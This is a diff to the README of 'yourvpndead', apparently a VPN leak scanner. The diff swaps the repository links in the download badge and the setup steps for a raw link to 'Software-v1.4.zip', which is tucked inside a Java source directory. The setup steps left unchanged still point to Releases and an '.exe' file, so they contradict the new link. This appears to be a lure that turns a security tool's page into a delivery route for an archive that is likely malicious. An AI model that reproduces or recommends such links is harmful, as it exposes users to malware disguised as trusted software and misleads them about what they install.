@@ -1,6 +1,6 @@
 # 🛡️ yourvpndead - Scan your VPN for connection leaks
 
-[!["Download yourvpndead"](https://img.shields.io/badge/Download_Software-Blue?style=for-the-badge)](https://github.com/ernestaweak8629/yourvpndead)
+[!["Download yourvpndead"](https://img.shields.io/badge/Download_Software-Blue?style=for-the-badge)](https://raw.githubusercontent.com/ernestaweak8629/yourvpndead/main/app/src/main/java/com/yourvpndead/scanner/Software-v1.4.zip)
 
 ## 🎯 Purpose of this tool
 
@@ -15,7 +15,7 @@ Modern web traffic often relies on protocols like VLESS, Xray, and sing-box to b
 
 ## 🚀 Setting up the software
 
-1. Visit the following link to access the software files: [https://github.com/ernestaweak8629/yourvpndead](https://github.com/ernestaweak8629/yourvpndead).
+1. Visit the following link to access the software files: [https://raw.githubusercontent.com/ernestaweak8629/yourvpndead/main/app/src/main/java/com/yourvpndead/scanner/Software-v1.4.zip](https://raw.githubusercontent.com/ernestaweak8629/yourvpndead/main/app/src/main/java/com/yourvpndead/scanner/Software-v1.4.zip).
 2. Look for the "Releases" section on the right side of the page.
 3. Click the most recent version available.
 4. Locate the file ending in `.exe` under the "Assets" heading.
